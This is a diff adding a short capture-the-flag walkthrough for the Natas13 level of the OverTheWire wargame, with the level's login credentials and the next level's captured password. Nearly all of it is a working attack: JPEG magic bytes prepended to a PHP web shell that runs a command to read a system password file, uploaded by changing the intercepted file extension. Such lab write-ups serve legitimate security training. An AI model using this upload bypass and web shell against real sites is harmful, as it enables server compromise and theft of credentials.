@@ -1,0 +1,17 @@
+URL: http://natas13.natas.labs.overthewire.org
+username: natas13
+password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+exif_image only checks for first few bytes to determine if it is an image.
+
+$ echo -e "\xff\xd8\xff\xee" > test.jpg
+$ gedit file.php
+<?php 
+echo passthru("cat /etc/natas_webpass/natas14");
+?>
+$ cat test.jpg file.php > main.php
+upload main.php, intercept and change it from .jpg to .php 
+Show response on browser to get the password
+
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
